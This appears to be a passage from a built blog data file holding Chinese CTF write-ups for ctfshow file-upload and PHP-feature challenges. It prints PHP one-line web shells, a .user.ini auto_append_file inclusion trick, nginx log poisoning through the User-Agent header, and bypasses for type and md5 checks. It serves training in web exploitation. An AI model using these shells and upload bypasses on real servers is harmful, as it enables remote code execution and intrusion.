多过滤了分号，改一下即可：\r\n>\r\n> ```\r\n> <?=include"/var/lo"."g/nginx/access.lo"."g"?>\r\n> ```\r\n\r\n### web158\r\n\r\n> 同上\r\n\r\n### web159\r\n\r\n> 同上\r\n\r\n### web160\r\n\r\n> 本题多过滤了括号和反引号，而且还过滤了log，日志包含也能做，用字符串拼接(php中用.来连接字符串)构造log:\r\n\r\n```\r\n<?=include"/var/lo"."g/nginx/access.lo"."g"?>\r\n<script language=\'php\'>eval($_POST[1]); <\/script>\r\n```\r\n\r\n> 这种小马在<?被过滤时用\r\n\r\n![image20](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071745551.png)\r\n\r\n> 然后上传.user.ini包含该文件即可：auto_append_file=/var/www/html/upload/hack.png\r\n\r\n> 然后在UA头改为想执行的命令访问主页，最后访问/upload，看看log里命令执行结果即可即可\r\n\r\n![image-20230607174625433](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071746472.png)\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n',contentRendered:'<h2 id="文件上传" tabindex="-1"><a class="header-anchor" href="#文件上传" aria-hidden="true">#</a> 文件上传</h2>\n<h2 id="web151" tabindex="-1"><a class="header-anchor" href="#web151" aria-hidden="true">#</a> Web151</h2>\n<blockquote>\n<p>（前端验证）</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image1" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071533948.png" data="aurora"></p>\n<blockquote>\n<p>在前端会有一些对后缀的过滤，前端过滤就进HTML检查元素把里面的限制语句直接删掉或者改成要上传的后缀名就能上传了，最简单方法就抓包改后缀就行了</p>\n<p>上传一个小马就能rce</p>\n</blockquote>\n<h3 id="web152" tabindex="-1"><a class="header-anchor" href="#web152" aria-hidden="true">#</a> Web152</h3>\n<blockquote>\n<p>(后端验证）</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image3" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071551531.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image4" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071552063.png" data="aurora"></p>\n<blockquote>\n<p>更改content-type在HTTP协议消息头中，使用Content-Type来表示媒体类型信息。它被用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析html或仅仅展示一个文本等。</p>\n<p><a href="https://blog.csdn.net/qq_14869093/article/details/86307084" target="_blank" rel="noopener noreferrer">Content-Type 详解_<ExternalLinkIcon/></a></p>\n<p>抓包后修改content-type 再发包就能绕过后端过滤</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image5" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071553673.png" data="aurora"></p>\n<h3 id="web153" tabindex="-1"><a class="header-anchor" href="#web153" aria-hidden="true">#</a> Web153</h3>\n<blockquote>\n<p>ini文件包含绕过</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image5" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071605355.png" data="aurora"></p>\n<blockquote>\n<p>upload文件夹能够直接访问，说明有index.php文件，所以能够用.user.ini<a href="https://blog.csdn.net/weixin_52635170/article/details/126962920" target="_blank" rel="noopener noreferrer">.user.ini漏洞<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p>\n</blockquote>\n<blockquote>\n<p>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image8" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071708978.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image9" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071709155.png" data="aurora"></p>\n<blockquote>\n<p>这样index.php就包含了1.txt的马然后rce</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image10" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710997.png" data="aurora"></p>\n<blockquote>\n<p>也可以用日志文件包含做</p>\n</blockquote>\n<h3 id="web154" tabindex="-1"><a class="header-anchor" href="#web154" aria-hidden="true">#</a> Web154</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image11" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710482.png" data="aurora"></p>\n<blockquote>\n<p>过滤了”php”内容 php语言对函数名、方法名、类名大小写不敏感 使用大写 或者短标签</p>\n</blockquote>\n<blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=eval($_POST[1]);？> &lt;?PHP eval($_POST[1]);？>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<blockquote>\n<p>没限制就继续用.user.ini漏洞写入包含文件</p>\n</blockquote>\n<h3 id="web155" tabindex="-1"><a class="header-anchor" href="#web155" aria-hidden="true">#</a> Web155</h3>\n<blockquote>\n<p>同上</p>\n</blockquote>\n<h3 id="web156" tabindex="-1"><a class="header-anchor" href="#web156" aria-hidden="true">#</a> web156</h3>\n<blockquote>\n<p>过滤了[]，用{}代替即可:</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=eval($_POST{cmd});?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<h3 id="web157" tabindex="-1"><a class="header-anchor" href="#web157" aria-hidden="true">#</a> web157</h3>\n<blockquote>\n<p>多过滤了分号，改一下即可：</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=include"/var/lo"."g/nginx/access.lo"."g"?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<h3 id="web158" tabindex="-1"><a class="header-anchor" href="#web158" aria-hidden="true">#</a> web158</h3>\n<blockquote>\n<p>同上</p>\n</blockquote>\n<h3 id="web159" tabindex="-1"><a class="header-anchor" href="#web159" aria-hidden="true">#</a> web159</h3>\n<blockquote>\n<p>同上</p>\n</blockquote>\n<h3 id="web160" tabindex="-1"><a class="header-anchor" href="#web160" aria-hidden="true">#</a> web160</h3>\n<blockquote>\n<p>本题多过滤了括号和反引号，而且还过滤了log，日志包含也能做，用字符串拼接(php中用.来连接字符串)构造log:</p>\n</blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?=include"/var/lo"."g/nginx/access.lo"."g"?>\n&lt;script language=\'php\'>eval($_POST[1]); &lt;/script>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><blockquote>\n<p>这种小马在&lt;?被过滤时用</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image20" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071745551.png" data="aurora"></p>\n<blockquote>\n<p>然后上传.user.ini包含该文件即可：auto_append_file=/var/www/html/upload/hack.png</p>\n</blockquote>\n<blockquote>\n<p>然后在UA头改为想执行的命令访问主页，最后访问/upload，看看log里命令执行结果即可即可</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230607174625433" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071746472.png" data="aurora"></p>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web2.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web2",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web2.md",filePathRelative:"web/web2.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web2.html.vue",componentFilePathRelative:"pages/web/web2.html.vue",componentFileChunkName:"v-d57b2632",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web2.html.js",dataFilePathRelative:"pages/web/web2.html.js",dataFileChunkName:"v-d57b2632",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web2.html",htmlFilePathRelative:"web/web2.html"},{data:{key:"v-d21174f4",path:"/web/web3.html",title:"php特性刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"php特性刷题",tag:["ctfshow刷题"],categories:["php特性","歪比八卜"]},excerpt:"",headers:[{level:2,title:"php特性",slug:"php特性",children:[{level:3,title:"Web89",slug:"web89",children:[]},{level:3,title:"Web90",slug:"web90",children:[]},{level:3,title:"Web91",slug:"web91",children:[]},{level:3,title:"Web92",slug:"web92",children:[]},{level:3,title:"Web93",slug:"web93",children:[]},{level:3,title:"Web94",slug:"web94",children:[]},{level:3,title:"Web95",slug:"web95",children:[]},{level:3,title:"Web96",slug:"web96",children:[]},{level:3,title:"Web97",slug:"web97",children:[]},{level:3,title:"Web98",slug:"web98",children:[]},{level:3,title:"Web99",slug:"web99",children:[]},{level:3,title:"Web100",slug:"web100",children:[]},{level:3,title:"web101",slug:"web101",children:[]},{level:3,title:"Web102",slug:"web102",children:[]}]}],git:{}},key:"v-d21174f4",path:"/web/web3.html",title:"php特性刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"php特性刷题",tag:["ctfshow刷题"],categories:["php特性","歪比八卜"]},excerpt:"",headers:[{level:2,title:"php特性",slug:"php特性",children:[{level:3,title:"Web89",slug:"web89",children:[]},{level:3,title:"Web90",slug:"web90",children:[]},{level:3,title:"Web91",slug:"web91",children:[]},{level:3,title:"Web92",slug:"web92",children:[]},{level:3,title:"Web93",slug:"web93",children:[]},{level:3,title:"Web94",slug:"web94",children:[]},{level:3,title:"Web95",slug:"web95",children:[]},{level:3,title:"Web96",slug:"web96",children:[]},{level:3,title:"Web97",slug:"web97",children:[]},{level:3,title:"Web98",slug:"web98",children:[]},{level:3,title:"Web99",slug:"web99",children:[]},{level:3,title:"Web100",slug:"web100",children:[]},{level:3,title:"web101",slug:"web101",children:[]},{level:3,title:"Web102",slug:"web102",children:[]}]}],content:'\r\n## php特性\r\n\r\n### Web89\r\n\r\n![image-20230607100007017](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000076.png)\r\n\r\n> 数组绕过原理：preg_match()只能处理字符串，当传入的subject是数组时会返回false intval（）用于获取变量的整数值。也可用于进制的转化\r\n\r\n> PHP 是一门弱类型语言不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。 \r\n\r\n### Web90\r\n\r\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000168.png" alt="image-20230607100032127"  />\r\n\r\n> 字符绕过：intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。如果参数是符点数，则返回他取整之后的值。\r\n\r\n> int intval ( mixed $var [, int $base = 10 ] )\r\n\r\n> 参数说明：\r\n\r\n> $var：要转换成 integer 的数量值。\r\n\r\n> $base：转化所使用的进制。\r\n\r\n> 如果 base 是 0，通过检测 var 的格式来决定使用的进制：\r\n\r\n> 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，如果字符串以 "0" 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。\r\n\r\n### Web91\r\n\r\n![image-20230607151820515](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071518574.png)\r\n\r\n> 一个正则判断\r\n\r\n> 去看就完事了[正则表达式全解析+正则表达式例子详解](https://blog.csdn.net/xuemoyao/article/details/8033138?ops_request_misc=%7B%22request%5Fid%22%3A%22165222532616782391878742%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=165222532616782391878742&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-8033138-null-null.142^v9^pc_search_result_control_group,157^v4^control&utm_term=正则表达式&spm=1018.2226.3001.4187)\r\n>\r\n> m是多行匹配，i是忽略大小写\r\n\r\n> ![clip_image007](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520576.png)匹配变量中多行开头到结尾要有php\r\n\r\n> ![clip_image008](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520696.png)匹配变量中一行行开头到结尾要有php\r\n\r\n### Web92\r\n\r\n![clip_image010](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520853.png)\r\n\r\n> 关于intval（）函数的用法看web90\r\n>\r\n> 这道题意思是num这个变量转化为八进制是4476，还是考intval的用法\r\n\r\n### Web93\r\n\r\n![clip_image011](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521259.png)\r\n\r\n> 相比上一题多了匹配正则 不能出现字母 断了16进制（0x） 8进制（0）不受影响，进制绕过\r\n\r\n### Web94\r\n\r\n![clip_image013](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521144.png)\r\n\r\n> strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.所以num值中要出现0，算一个比较函数\r\n\r\n> 第三个判断就限制了八进制 如果num==010574 strpos()返回字符串第一次出现的位置就是0，第三个判断就满足了就绕不过了\r\n\r\n> 浮点绕过\r\n\r\n### Web95\r\n\r\n![clip_image015](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521951.png)\r\n\r\n> Intval（）函数会将输入的数前的“空格”和“+”（有且仅有）可当成输入的数为正数，一个绕过方法\r\n\r\n### Web96\r\n\r\n![clip_image017](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521040.png)\r\n\r\n> Highlight_file可带路径，所以变量可以是路径\r\n\r\n### Web97\r\n\r\n![clip_image019](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521079.png)\r\n\r\n> 考察md5加密：[ MD5加密漏洞(MD5绕过方式-0e绕过/数组绕过/MD5碰撞/MD5SQL注入)](https://blog.csdn.net/wangyuxiang946/article/details/119845182?ops_request_misc=%7B%22request%5Fid%22%3A%22165261132516782184692274%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=165261132516782184692274&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-119845182-null-null.142^v9^pc_search_result_control_group,157^v4^control&utm_term=md5数组&spm=1018.2226.3001.4187)\r\n\r\n> MD5是一种散列函数,是哈希算法的一种,可以将任意长度的输入,通过散列算法变换成128位的散列值\r\n\r\n> MD5加密有4种绕过方式1、0e绕过1、数组绕过1、MD5碰撞1、MD5SQL注入\r\n\r\n> 这道题需要用到===强比较（判断内容的基础上,还会判断类型是否相同），所以不能用0e弱比较绕过，用数组绕过\r\n>\r\n> 由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样\r\n>\r\n> null === null 满足条件就可以绕过了\r\n\r\n![clip_image021](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522290.png)\r\n\r\n### Web98\r\n\r\n![clip_image023](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522985.png)\r\n\r\n> 用到了？三元运算符 即前面表达式为真，则执行：前的，反之执行：后的\r\n\r\n> “=&“的一个说明\r\n\r\n> $a = $b; //把$b赋值给$a,如果赋值之后,$b改变了,$a不变\r\n\r\n> $a =&$b; //把$b的地址传递给$a,这时候,$a和$b都指向内存中的同一块地址,所以如果赋值后,$b改变,$a也会改变\r\n\r\n> 如果$_GET有东西传参进去就  将$_GET方法变成$_POST方法\r\n\r\n> 思路：随便传一个get值，不能是flag=flag就行，并传post值HTTP_FLAG=flag 在判断highlight_file时就能通过\r\n\r\n![clip_image025](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522735.png)\r\n\r\n \r\n\r\n### Web99\r\n\r\n![clip_image027](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522978.png)\r\n\r\n> array_push() 函数向数组尾部插入一个或多个元素。\r\n\r\n> array_push(*array,value1,value2...*)\r\n\r\n> $a=array("a"=>"red","b"=>"green");\r\n>  array_push($a,"blue","yellow"); 两种使用方式\r\n\r\n> 如果数组\r\n\r\n \r\n\r\n> file_put_contents() 函数把一个字符串写入文件中。如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。\r\n\r\n> in_array — 检查数组中是否存在某个值{\r\n\r\n> in_array(mixed $needle, array $haystack, bool $strict = false): bool\r\n\r\n> 大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 }36-846的随机写入数字 有一个概率问题 到底会有什么会在allow数组中 1的可能性是最大的\r\n\r\n> 这道题是弱比较类型所以 字符串类型绕过1.php==1\r\n\r\n> 通过post传参写入 rce\r\n>\r\n> 然后访问2.php就行\r\n\r\n![clip_image029](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523710.png)\r\n\r\n### Web100\r\n\r\n![clip_image031](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523863.png)\r\n\r\n> is_numeric — 检测变量是否为数字或数字字符串 \r\n\r\n> 如果 `value` 是数字或[数字字符串](https://www.php.net/manual/zh/language.types.numeric-strings.php)， 返回 `**true**`；否则返回 `**false**`。\r\n\r\n> 这里是个大坑 因为赋值运算优先于逻辑判断，且赋值运算逻辑为true 所以这个$v0与后面的$v2$v3无关\r\n\r\n> 还有$v2中不能出现； 考虑PHP语句最后一句可不加；直接闭合\r\n\r\n![clip_image033](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523123.png)\r\n\r\n \r\n\r\n> 正常RCE\r\n\r\n> ctfshow{2d6dd5c50x2d8c980x2d4c3e0x2da10e0x2dc6b39863b5e2}\r\n\r\n> 0x2d=”-”\r\n\r\n> ctfshow{2d6dd5c5-8c98-4c3e-a10e-c6b39863b5e2}\r\n\r\n### web101\r\n\r\n> 考点：PHP 反射机制Reflection[PHP: ReflectionClass - Manual](https://www.php.net/manual/zh/class.reflectionclass.php)\r\n\r\n> **ReflectionClass** 类报告了一个类的有关信息。\r\n\r\n![clip_image035](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523714.png)\r\n\r\n> 这样可以echo出asd类中的属性及其方法\r\n\r\n![clip_image037](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523658.png)\r\n\r\n> 注意这次的flag值少了一位，自己猜一下\r\n\r\n### Web102\r\n\r\n![clip_image039](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523844.png)\r\n\r\n> substr() 函数返回字符串的一部分。substr(string,start,length)\r\n\r\n> call_user_func — 把第一个参数作为回调函数调用',contentRendered:'<h2 id="php特性" tabindex="-1"><a class="header-anchor" href="#php特性" aria-hidden="true">#</a> php特性</h2>\n<h3 id="web89" tabindex="-1"><a class="header-anchor" href="#web89" aria-hidden="true">#</a> Web89</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230607100007017" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000076.png" data="aurora"></p>\n<blockquote>\n<p>数组绕过原理：preg_match()只能处理字符串，当传入的subject是数组时会返回false intval（）用于获取变量的整数值。也可用于进制的转化</p>\n</blockquote>\n<blockquote>\n<p>PHP 是一门弱类型语言不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。</p>\n</blockquote>\n<h3 id="web90" tabindex="-1"><a class="header-anchor" href="#web90" aria-hidden="true">#</a> Web90</h3>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000168.png" alt="image-20230607100032127"  />\n<blockquote>\n<p>字符绕过：intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。如果参数是符点数，则返回他取整之后的值。</p>\n</blockquote>\n<blockquote>\n<p>int intval ( mixed $var [, int $base = 10 ] )</p>\n</blockquote>\n<blockquote>\n<p>参数说明：</p>\n</blockquote>\n<blockquote>\n<p>$var：要转换成 integer 的数量值。</p>\n</blockquote>\n<blockquote>\n<p>$base：转化所使用的进制。</p>\n</blockquote>\n<blockquote>\n<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>\n</blockquote>\n<blockquote>\n<p>如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。</p>\n</blockquote>\n<h3 id="web91" tabindex="-1"><a class="header-anchor" href="#web91" aria-hidden="true">#</a> Web91</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230607151820515" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071518574.png" data="aurora"></p>\n<blockquote>\n<p>一个正则判断</p>\n</blockquote>\n<blockquote>\n<p>去看就完事了<a href="https://blog.csdn.net/xuemoyao/article/details/8033138?ops_request_misc=%7B%22request%5Fid%22%3A%22165222532616782391878742%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=165222532616782391878742&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-8033138-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&amp;utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener noreferrer">正则表达式全解析+正则表达式例子详解<ExternalLinkIcon/></a></p>\n<p>m是多行匹配，i是忽略大小写</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image007" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520576.png" data="aurora">匹配变量中多行开头到结尾要有php</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image008" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520696.png" data="aurora">匹配变量中一行行开头到结尾要有php</p>\n</blockquote>\n<h3 id="web92" tabindex="-1"><a class="header-anchor" href="#web92" aria-hidden="true">#</a> Web92</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image010" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520853.png" data="aurora"></p>\n<blockquote>\n<p>关于intval（）函数的用法看web90</p>\n<p>这道题意思是num这个变量转化为八进制是4476，还是考intval的用法</p>\n</blockquote>\n<h3 id="web93" tabindex="-1"><a class="header-anchor" href="#web93" aria-hidden="true">#</a> Web93</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image011" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521259.png" data="aurora"></p>\n<blockquote>\n<p>相比上一题多了匹配正则 不能出现字母 断了16进制（0x） 8进制（0）不受影响，进制绕过</p>\n</blockquote>\n<h3 id="web94" tabindex="-1"><a class="header-anchor" href="#web94" aria-hidden="true">#</a> Web94</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image013" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521144.png" data="aurora"></p>\n<blockquote>\n<p>strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.所以num值中要出现0，算一个比较函数</p>\n</blockquote>\n<blockquote>\n<p>第三个判断就限制了八进制 如果num==010574 strpos()返回字符串第一次出现的位置就是0，第三个判断就满足了就绕不过了</p>\n</blockquote>\n<blockquote>\n<p>浮点绕过</p>\n</blockquote>\n<h3 id="web95" tabindex="-1"><a class="header-anchor" href="#web95" aria-hidden="true">#</a> Web95</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image015" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521951.png" data="aurora"></p>\n<blockquote>\n<p>Intval（）函数会将输入的数前的“空格”和“+”（有且仅有）可当成输入的数为正数，一个绕过方法</p>\n</blockquote>\n<h3 id="web96" tabindex="-1"><a class="header-anchor" href="#web96" aria-hidden="true">#</a> Web96</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image017" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521040.png" data="aurora"></p>\n<blockquote>\n<p>Highlight_file可带路径，所以变量可以是路径</p>\n</blockquote>\n<h3 id="web97" tabindex="-1"><a class="header-anchor" href="#web97" aria-hidden="true">#</a> Web97</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image019" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521079.png" data="aurora"></p>\n<blockquote>\n<p>考察md5加密：<a href="https://blog.csdn.net/wangyuxiang946/article/details/119845182?ops_request_misc=%7B%22request%5Fid%22%3A%22165261132516782184692274%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=165261132516782184692274&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-119845182-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&amp;utm_term=md5%E6%95%B0%E7%BB%84&amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener noreferrer"> MD5加密漏洞(MD5绕过方式-0e绕过/数组绕过/MD5碰撞/MD5SQL注入)<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>MD5是一种散列函数,是哈希算法的一种,可以将任意长度的输入,通过散列算法变换成128位的散列值</p>\n</blockquote>\n<blockquote>\n<p>MD5加密有4种绕过方式1、0e绕过1、数组绕过1、MD5碰撞1、MD5SQL注入</p>\n</blockquote>\n<blockquote>\n<p>这道题需要用到===强比较（判断内容的基础上,还会判断类型是否相同），所以不能用0e弱比较绕过，用数组绕过</p>\n<p>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样</p>\n<p>null === null 满足条件就可以绕过了</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image021" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522290.png" data="aurora"></p>\n<h3 id="web98" tabindex="-1"><a class="header-anchor" href="#web98" aria-hidden="true">#</a> Web98</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image023" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522985.png" data="aurora"></p>\n<blockquote>\n<p>用到了？三元运算符 即前面表达式为真，则执行：前的，反之执行：后的</p>\n</blockquote>\n<blockquote>\n<p>“=&amp;“的一个说明</p>\n</blockquote>\n<blockquote>\n<p>$a = $b; //把$b赋值给$a,如果赋值之后,$b改变了,$a不变</p>\n</blockquote>\n<blockquote>\n<p>$a =&amp;$b; //把$b的地址传递给$a,这时候,$a和$b都指向内存中的同一块地址,所以如果赋值后,$b改变,$a也会改变</p>\n</blockquote>\n<blockquote>\n<p>如果$_GET有东西传参进去就  将$_GET方法变成$_POST方法</p>\n</blockquote>\n<blockquote>\n<p>思路：随便传一个get值，不能是flag=flag就行，并传post值HTTP_FLAG=flag 在判断highlight_file时就能通过</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image025" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522735.png" data="aurora"></p>\n<h3 id="web99" tabindex="-1"><a class="header-anchor" href="#web99" aria-hidden="true">#</a> Web99</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image027" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522978.png" data="aurora"></p>\n<blockquote>\n<p>array_push() 